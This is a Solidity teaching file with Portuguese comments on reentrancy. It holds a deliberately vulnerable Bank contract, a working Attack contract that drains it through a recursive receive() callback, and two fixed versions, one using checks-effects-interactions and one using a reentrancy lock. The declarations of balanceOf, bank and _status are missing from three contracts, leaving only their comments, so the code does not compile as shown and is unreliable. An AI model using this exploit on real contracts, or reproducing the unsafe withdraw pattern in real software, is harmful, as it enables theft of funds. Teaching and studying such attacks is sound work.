// SPDX-License-Identifier: MIT
// por 0xAA
pragma solidity ^0.8.4;

contract Bank {
    // Mapeamento de saldo

    // Depositar ether e atualizar o saldo
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // Extrair todos os ether do msg.sender
    function withdraw() external {
        // Obter saldo
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");
        // Transferir ether !!! Pode ativar a função fallback/receive de um contrato malicioso, há risco de reentrância!
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
        // Atualizar saldo
        balanceOf[msg.sender] = 0;
    }

    // Obter o saldo do contrato bancário
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    // Endereço do contrato Bank

    // Inicializando o endereço do contrato Bank
    constructor(Bank _bank) {
        bank = _bank;
    }
    
    // Função de callback para realizar um ataque de reentrada no contrato Bank, chamando repetidamente a função withdraw do alvo.
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    // Função de ataque, chame com msg.value definido como 1 ether
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // Obter o saldo deste contrato
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// Usando o modo de verificação-efeito-interação (checks-effect-interaction) para prevenir ataques de reentrada
contract GoodBank {
    mapping (address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");
        // Verificar o modo de interação de efeitos (checks-effect-interaction): atualizar primeiro a alteração do saldo e, em seguida, enviar ETH.
        // Quando ocorre um ataque de reentrada, balanceOf[msg.sender] já foi atualizado para 0, não passando pela verificação acima.
        balanceOf[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// Usando um bloqueio de reentrada para evitar ataques de reentrada
contract ProtectedBank {
    mapping (address => uint256) public balanceOf;
    // Lock Reentrante

    // Lock Reentrante
    modifier nonReentrant() {
        // Quando nonReentrant é chamado pela primeira vez, _status será 0
        require(_status == 0, "ReentrancyGuard: reentrant call");
        // Após isso, qualquer chamada a nonReentrant falhará
        _status = 1;
        _;
        // Chamada concluída, restaurando _status para 0
        _status = 0;
    }


    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // Usando um lock de reentrada para proteger uma função com vulnerabilidades
    function withdraw() external nonReentrant{
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");

        balanceOf[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

